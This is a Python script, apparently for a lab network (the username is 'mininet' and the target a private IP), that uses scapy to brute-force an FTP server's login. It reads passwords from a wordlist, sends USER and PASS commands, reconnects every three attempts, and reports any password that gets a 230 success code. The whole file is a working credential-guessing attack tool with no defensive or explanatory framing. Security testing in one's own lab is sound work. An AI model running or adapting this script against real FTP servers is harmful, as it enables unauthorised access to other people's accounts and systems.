import scapy.all as scapy
from scapy.layers.inet import IP, TCP

# define target FTP server IP and port number
target_ip = "10.12.0.40"
target_port = 21

# define a list of usernames and passwords to try
usernames = ["mininet"]
passwords = []
with open("passwords.txt", encoding="utf8") as passws:
	passwords = passws.readlines()

# loop through each username and password combination and try to connect to the FTP server
attempts = 0
for username in usernames:
    for password in passwords:
        password = password.strip()
        if attempts%3 == 0:
            if attempts>0:
                stream.close()
            print("Opening connection")
            stream = scapy.TCP_client.tcplink(scapy.Raw, target_ip, target_port)
            ftp_response = stream.recv()
        if "220" in str(ftp_response) or "530" in str(ftp_response):
            stream.send("USER {}\r\n".format(username).encode())
            ftp_response = stream.recv()
            # check if the response contains the "331" code, indicating that the username was accepted
            if "331" in str(ftp_response):
                # send the password and check if the response contains the "230" code, indicating that the login was successful
                stream.send("PASS {}\r\n".format(password).encode())
                print("Password {} sent for username {} ({}/{})".format(password, username, attempts, len(passwords)))
                ftp_response = stream.recv()
                if "230" in str(ftp_response):
                    print("Login successful with username:", username, "and password:", password)
                    stream.close()
                    exit(0)
        if "421" in str(ftp_response):
            print("Error" , ftp_response)
            exit(0)
        attempts+=1
stream.close()
